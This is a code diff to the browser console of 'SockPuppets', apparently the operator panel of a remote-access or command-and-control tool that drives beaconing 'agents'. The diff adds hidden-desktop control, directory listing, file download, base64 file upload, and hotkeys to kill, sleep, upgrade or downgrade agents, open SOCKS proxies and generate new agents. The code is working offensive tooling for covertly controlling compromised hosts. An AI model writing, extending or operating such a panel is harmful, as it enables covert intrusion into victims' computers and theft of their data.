@@ -494,7 +494,6 @@
                 if (status) status.textContent = (right ? 'rclick ' : 'click ') + x + ' ' + y;
                 img.focus();
                 desktopActionFor(agentId, (right ? 'rclick ' : 'click ') + x + ' ' + y);
-                setTimeout(function() { desktopActionFor(agentId, 'frame'); }, 700);
             }
             var hdPane = document.getElementById('hd-' + agentId);
             hdPane.addEventListener('pointerdown', function(e) { desktopClick(e, e.button === 2); });
@@ -568,15 +567,24 @@
     var HELP_TEXT = [
         'SockPuppets Agent Console',
         '─────────────────────────',
-        'Shell Commands:',
+        'Shell:',
         '  <any command>      Execute via cmd.exe / sh',
         '  cd <dir>           Change working directory',
         '',
-        'Agent Control:',
+        'Same as the terminal:',
+        '  desktop <action>   Hidden desktop (start, frame, click x y, type, key)',
+        '  ls <path>          List a directory',
+        '  get <path>         Download a file',
+        '  put <remote>       Upload a local file (opens a picker)',
+        '',
+        'Agent control:',
         '  __kill             Terminate agent process',
         '  __sleep <secs>     Set beacon interval',
         '',
-        'Built-in:',
+        'Keys (when not typing):',
+        '  F1 help  F2 generate  F5 refresh',
+        '  k kill  s sleep  u upgrade  d downgrade  p socks  h desktop',
+        '',
         '  help               Show this help',
         '  clear              Clear console output',
     ].join('\n');
@@ -593,6 +601,28 @@
         }
         if (command.indexOf('desktop ') === 0) {
             command = '__hd:' + command.slice(8);
+        } else if (command === 'desktop') {
+            command = '__hd:frame';
+        } else if (command === 'ls' || command.indexOf('ls ') === 0) {
+            command = '__fs:ls:' + (command.length > 3 ? command.slice(3) : '.');
+        } else if (command.indexOf('get ') === 0) {
+            command = '__fs:get:' + command.slice(4);
+        } else if (command.indexOf('put ') === 0) {
+            var remote = command.slice(4).trim();
+            var picker = document.createElement('input');
+            picker.type = 'file';
+            picker.onchange = function() {
+                var file = picker.files && picker.files[0];
+                if (!file) return;
+                var reader = new FileReader();
+                reader.onload = function() {
+                    var b64 = String(reader.result).split(',')[1] || '';
+                    sendCommand(agentId, '__fs:put:' + (remote || file.name) + '\t' + b64);
+                };
+                reader.readAsDataURL(file);
+            };
+            picker.click();
+            return;
         }
         try {
             var result = await api('POST', '/agents/' + agentId + '/command', { command: command });
@@ -634,6 +664,28 @@
     }
 
     // --- Generate modal ---
+    function selectedOrFirst() {
+        if (selectedAgentId) return selectedAgentId;
+        var row = document.querySelector('#agent-table tbody tr');
+        return row ? row.dataset.agentId : null;
+    }
+
+    document.addEventListener('keydown', function(e) {
+        var tag = (e.target.tagName || '').toLowerCase();
+        if (tag === 'input' || tag === 'textarea' || e.target.isContentEditable) return;
+        if (document.getElementById('app').classList.contains('hidden')) return;
+        var id = selectedOrFirst();
+        if (e.key === 'F1') { e.preventDefault(); if (id) { openConsole(id); appendConsole(id, HELP_TEXT, 'info'); } }
+        else if (e.key === 'F2') { e.preventDefault(); document.getElementById('btn-generate').click(); }
+        else if (e.key === 'F5') { e.preventDefault(); refreshAgents(); }
+        else if (!id) return;
+        else if (e.key === 'k' || e.key === 's' || e.key === 'u' || e.key === 'd' || e.key === 'p') {
+            selectedAgentId = id;
+            handleContextAction({k:'kill', s:'sleep', u:'upgrade', d:'downgrade', p:'socks'}[e.key]);
+        }
+        else if (e.key === 'h') { e.preventDefault(); selectedAgentId = id; openDesktop(id); }
+    });
+
     document.getElementById('btn-generate').addEventListener('click', function() {
         document.getElementById('generate-modal').classList.remove('hidden');
     });
